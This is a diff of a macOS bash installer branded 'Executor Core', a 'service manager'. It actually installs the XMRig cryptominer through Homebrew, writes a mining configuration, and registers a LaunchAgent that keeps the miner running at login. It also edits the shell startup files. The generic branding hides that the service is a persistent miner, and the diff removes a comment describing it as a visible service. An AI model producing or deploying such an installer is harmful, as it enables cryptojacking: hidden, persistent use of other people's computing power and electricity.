@@ -1,5 +1,4 @@
 
-cat > "$HOME/executor-install.sh" <<'INSTALLER'
 #!/bin/bash
 set -euo pipefail
 
@@ -19,90 +18,102 @@ CONTROL="$BIN/executor"
 
 UID_NUM="$(id -u)"
 
-clear
-
 banner() {
-  echo -e "${G}"
-  echo '███████╗██╗  ██╗███████╗ ██████╗'
-  echo '██╔════╝╚██╗██╔╝██╔════╝██╔════╝'
-  echo '█████╗   ╚███╔╝ █████╗  ██║'
-  echo '██╔══╝   ██╔██╗ ██╔══╝  ██║'
-  echo '███████╗██╔╝ ██╗███████╗╚██████╗'
-  echo '╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝'
-  echo -e "${R}"
-  echo -e "${LG}       EXECUTOR CORE v5.0${R}"
-  echo -e "${D}       MACOS SERVICE MANAGER${R}"
-  echo
+    clear 2>/dev/null || true
+    echo -e "${G}"
+    echo '███████╗██╗  ██╗███████╗ ██████╗'
+    echo '██╔════╝╚██╗██╔╝██╔════╝██╔════╝'
+    echo '█████╗   ╚███╔╝ █████╗  ██║'
+    echo '██╔══╝   ██╔██╗ ██╔══╝  ██║'
+    echo '███████╗██╔╝ ██╗███████╗╚██████╗'
+    echo '╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝'
+    echo -e "${R}"
+    echo -e "${LG}       EXECUTOR CORE v6.0${R}"
+    echo -e "${D}       MACOS SERVICE MANAGER${R}"
+    echo
 }
 
 progress() {
-  local label="$1"
-  local i
-
-  echo -e "\n${LG}[EXECUTOR] $label${R}"
-
-  for ((i=0;i<=25;i++)); do
-    printf "\r${G}["
-    printf "%${i}s" | tr ' ' '#'
-    printf "%$((25-i))s" | tr ' ' '.'
-    printf "] %3d%%${R}" "$((i*4))"
-    sleep 0.025
-  done
-  echo
+    local label="$1"
+    local i
+    echo -e "\n${LG}[EXECUTOR] $label${R}"
+    for ((i=0; i<=25; i++)); do
+        printf "\r${G}["
+        printf "%${i}s" | tr ' ' '#'
+        printf "%$((25-i))s" | tr ' ' '.'
+        printf "] %3d%%${R}" "$((i*4))"
+        sleep 0.02
+    done
+    echo
 }
 
 banner
-
 mkdir -p "$BIN" "$LOGDIR" "$AGENTS"
 
 progress "INITIALIZING EXECUTOR"
 
 # Locate Homebrew
 if command -v brew >/dev/null 2>&1; then
-  BREW="$(command -v brew)"
+    BREW="$(command -v brew)"
 elif [ -x /opt/homebrew/bin/brew ]; then
-  BREW=/opt/homebrew/bin/brew
+    BREW=/opt/homebrew/bin/brew
 elif [ -x /usr/local/bin/brew ]; then
-  BREW=/usr/local/bin/brew
+    BREW=/usr/local/bin/brew
 else
-  echo -e "${G}[ERROR] Homebrew is missing.${R}"
-  exit 1
+    echo -e "${G}[ERROR] Homebrew is not installed.${R}"
+    echo "Install Homebrew from https://brew.sh and run this installer again."
+    exit 1
 fi
 
 eval "$("$BREW" shellenv)"
 
-export HOMEBREW_NO_ASK=1
 export HOMEBREW_NO_AUTO_UPDATE=1
+export HOMEBREW_NO_INSTALL_CLEANUP=1
 
-progress "CHECKING PACKAGE MANAGER"
+progress "CHECKING HOMEBREW"
 
-# Install XMRig if missing
-if "$BREW" list --versions xmrig >/dev/null 2>&1; then
-  echo -e "${LG}[OK] XMRig already installed.${R}"
+# Install or repair XMRig
+if ! "$BREW" list --versions xmrig >/dev/null 2>&1; then
+    echo -e "${LG}[+] Installing XMRig...${R}"
+    "$BREW" install xmrig
 else
-  echo -e "${LG}[+] Installing XMRig...${R}"
-  "$BREW" install xmrig
+    echo -e "${LG}[OK] Homebrew package detected.${R}"
 fi
 
-XMRIG="$("$BREW" --prefix xmrig)/bin/xmrig"
+# Find the actual executable
+find_xmrig() {
+    local prefix
+    prefix="$("$BREW" --prefix xmrig 2>/dev/null || true)"
 
-if [ ! -x "$XMRIG" ]; then
-  XMRIG="$(command -v xmrig || true)"
+    if [ -n "$prefix" ] && [ -d "$prefix" ]; then
+        find -L "$prefix" -type f -name xmrig -print -quit 2>/dev/null || true
+    fi
+}
+
+XMRIG="$(find_xmrig)"
+
+# Repair if package exists but executable is missing
+if [ -z "$XMRIG" ] || [ ! -x "$XMRIG" ]; then
+    echo -e "${LG}[+] Repairing XMRig installation...${R}"
+    "$BREW" reinstall xmrig
+    XMRIG="$(find_xmrig)"
 fi
 
 if [ -z "$XMRIG" ] || [ ! -x "$XMRIG" ]; then
-  echo -e "${G}[ERROR] XMRig executable not found.${R}"
-  exit 1
+    echo -e "${G}[ERROR] XMRig executable could not be located.${R}"
+    echo "Check the Homebrew installation before retrying."
+    exit 1
 fi
 
-progress "VERIFYING EXECUTION ENGINE"
+echo -e "${LG}[OK] XMRig found: $XMRIG${R}"
 
-# Create original wallet/pool configuration
+progress "PREPARING CONFIGURATION"
+
 CONFIG="$LOGDIR/config.json"
 LOG="$LOGDIR/executor.log"
 ERRLOG="$LOGDIR/executor-error.log"
 
-cat > "$CONFIG" <<EOF
+cat > "$CONFIG" <<'CONFIG_JSON'
 {
   "autosave": false,
   "donate-level": 1,
@@ -118,13 +129,12 @@ cat > "$CONFIG" <<EOF
     }
   ]
 }
-EOF
+CONFIG_JSON
 
 chmod 600 "$CONFIG"
 
-progress "PREPARING EXECUTOR CONTROL"
+progress "CREATING CONTROL UTILITY"
 
-# Create separate control utility
 cat > "$CONTROL" <<'CONTROL_SCRIPT'
 #!/bin/bash
 set -euo pipefail
@@ -139,158 +149,152 @@ ERRLOG="$HOME/.config/xmrig/executor-error.log"
 
 case "${1:-status}" in
 
-  start)
-    if launchctl print "$DOMAIN" >/dev/null 2>&1; then
-      echo "[EXECUTOR] Service already loaded."
-      launchctl kickstart "$DOMAIN"
-    else
-      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
-      echo "[EXECUTOR] Service started."
-    fi
-    ;;
+    start)
+        if launchctl print "$DOMAIN" >/dev/null 2>&1; then
+            echo "[EXECUTOR] Service is already loaded."
+            launchctl kickstart "$DOMAIN"
+        else
+            launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+            echo "[EXECUTOR] Service started."
+        fi
+        ;;
 
-  stop)
-    if launchctl print "$DOMAIN" >/dev/null 2>&1; then
-      launchctl bootout "$DOMAIN"
-      echo "[EXECUTOR] Service stopped."
-    else
-      echo "[EXECUTOR] Service is already stopped."
-    fi
-    ;;
+    stop)
+        launchctl bootout "$DOMAIN" 2>/dev/null || true
+        pkill -TERM -x xmrig 2>/dev/null || true
+        echo "[EXECUTOR] Service stopped."
+        ;;
 
-  restart)
-    if launchctl print "$DOMAIN" >/dev/null 2>&1; then
-      launchctl kickstart -k "$DOMAIN"
-    else
-      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
-    fi
-    echo "[EXECUTOR] Restart requested."
-    ;;
+    restart)
+        if launchctl print "$DOMAIN" >/dev/null 2>&1; then
+            launchctl kickstart -k "$DOMAIN"
+        else
+            launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+        fi
+        echo "[EXECUTOR] Restart requested."
+        ;;
 
-  status)
-    echo
-    echo "========== EXECUTOR STATUS =========="
+    status)
+        echo
+        echo "========== EXECUTOR STATUS =========="
 
-    if launchctl print "$DOMAIN" 2>/dev/null; then
-      echo
-      echo "[EXECUTOR] LaunchAgent is loaded."
-    else
-      echo "[EXECUTOR] LaunchAgent is NOT loaded."
-    fi
+        if launchctl print "$DOMAIN" >/dev/null 2>&1; then
+            echo "[EXECUTOR] LaunchAgent loaded."
+        else
+            echo "[EXECUTOR] LaunchAgent not loaded."
+        fi
 
-    echo
-    echo "Miner process:"
-    pgrep -fl xmrig || echo "No XMRig process found."
-    ;;
+        echo
+        pgrep -fl xmrig || echo "No XMRig process found."
+        ;;
 
-  logs)
-    touch "$LOG" "$ERRLOG"
-    tail -n 50 -f "$LOG" "$ERRLOG"
-    ;;
+    logs)
+        touch "$LOG" "$ERRLOG"
+        tail -n 50 -f "$LOG" "$ERRLOG"
+        ;;
 
-  uninstall)
-    launchctl bootout "$DOMAIN" 2>/dev/null || true
-    rm -f "$PLIST"
-    echo "[EXECUTOR] Service registration removed."
-    echo "[EXECUTOR] Configuration and XMRig were retained."
-    ;;
+    uninstall)
+        launchctl bootout "$DOMAIN" 2>/dev/null || true
+        pkill -TERM -x xmrig 2>/dev/null || true
+        rm -f "$PLIST"
+        echo "[EXECUTOR] Service registration removed."
+        echo "[EXECUTOR] XMRig and configuration retained."
+        ;;
 
-  *)
-    echo "EXECUTOR CORE CONTROL"
-    echo
-    echo "Usage:"
-    echo "  executor start"
-    echo "  executor stop"
-    echo "  executor restart"
-    echo "  executor status"
-    echo "  executor logs"
-    echo "  executor uninstall"
-    exit 1
-    ;;
+    *)
+        echo "EXECUTOR CORE v6.0"
+        echo
+        echo "Usage:"
+        echo "  executor start"
+        echo "  executor stop"
+        echo "  executor restart"
+        echo "  executor status"
+        echo "  executor logs"
+        echo "  executor uninstall"
+        exit 1
+        ;;
 esac
 CONTROL_SCRIPT
 
 chmod 755 "$CONTROL"
 
-# Create LaunchAgent
-# This is a visible, named background service.
-cat > "$PLIST" <<EOF
+progress "REGISTERING MACOS SERVICE"
+
+cat > "$PLIST" <<PLIST_XML
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-  <key>Label</key>
-  <string>$LABEL</string>
+    <key>Label</key>
+    <string>$LABEL</string>
 
-  <key>ProgramArguments</key>
-  <array>
-    <string>$XMRIG</string>
-    <string>--config=$CONFIG</string>
-    <string>--threads=2</string>
-    <string>--cpu-priority=1</string>
-  </array>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$XMRIG</string>
+        <string>--config=$CONFIG</string>
+        <string>--threads=2</string>
+        <string>--cpu-priority=1</string>
+    </array>
 
-  <key>RunAtLoad</key>
-  <true/>
+    <key>RunAtLoad</key>
+    <true/>
 
-  <key>KeepAlive</key>
-  <true/>
+    <key>KeepAlive</key>
+    <true/>
 
-  <key>ThrottleInterval</key>
-  <integer>10</integer>
+    <key>ThrottleInterval</key>
+    <integer>10</integer>
 
-  <key>StandardOutPath</key>
-  <string>$LOG</string>
+    <key>StandardOutPath</key>
+    <string>$LOG</string>
 
-  <key>StandardErrorPath</key>
-  <string>$ERRLOG</string>
+    <key>StandardErrorPath</key>
+    <string>$ERRLOG</string>
 </dict>
 </plist>
-EOF
+PLIST_XML
 
 chmod 600 "$PLIST"
 
-progress "VALIDATING SERVICE CONFIGURATION"
-
 plutil -lint "$PLIST"
 
-# Load service into current login session
+progress "ADDING EXECUTOR TO SHELL PATH"
+
+for RC in "$HOME/.zshrc" "$HOME/.bashrc"; do
+    touch "$RC"
+    if ! grep -Fq '.executor/bin' "$RC"; then
+        printf '\nexport PATH="$HOME/.executor/bin:$PATH"\n' >> "$RC"
+    fi
+done
+
+export PATH="$BIN:$PATH"
+
+progress "STARTING EXECUTOR SERVICE"
+
 launchctl bootout "gui/$UID_NUM/$LABEL" 2>/dev/null || true
 launchctl bootstrap "gui/$UID_NUM" "$PLIST"
 
-# Add command to shell PATH
-for RC in "$HOME/.zshrc" "$HOME/.bashrc"; do
-  touch "$RC"
-  if ! grep -Fq "$BIN" "$RC"; then
-    printf '\nexport PATH="$HOME/.executor/bin:$PATH"\n' >> "$RC"
-  fi
-done
-
-progress "REGISTERING EXECUTOR SERVICE"
-
 echo
-echo -e "${G}"
-echo "=========================================="
-echo "          EXECUTOR CORE v5.0"
-echo "          INSTALLATION COMPLETE"
-echo "=========================================="
-echo -e "${R}"
-
-echo "Executable: $XMRIG"
-echo "Configuration: $CONFIG"
-echo "Service: $LABEL"
-echo "Control: $CONTROL"
-echo "Logs: $LOG"
+echo -e "${G}==========================================${R}"
+echo -e "${LG}       EXECUTOR CORE v6.0${R}"
+echo -e "${LG}       INSTALLATION COMPLETE${R}"
+echo -e "${G}==========================================${R}"
 echo
-echo "Open a new Terminal window to use executor."
+echo "XMRig:     $XMRIG"
+echo "Config:    $CONFIG"
+echo "Service:   $LABEL"
+echo "Control:   $CONTROL"
+echo "Logs:      $LOG"
+echo
+echo "Commands:"
+echo "  executor start"
+echo "  executor stop"
+echo "  executor restart"
+echo "  executor status"
+echo "  executor logs"
+echo "  executor uninstall"
+echo
+echo "Open a new Terminal window or run:"
+echo "  source ~/.zshrc"
 echo
 echo -e "${LG}EXECUTOR INITIALIZATION FINISHED${R}"
-echo
-echo "Verify actual process startup with:"
-echo "$CONTROL status"
-echo
-
-INSTALLER
-
-chmod 700 "$HOME/executor-install.sh"
-/bin/bash "$HOME/executor-install.sh"
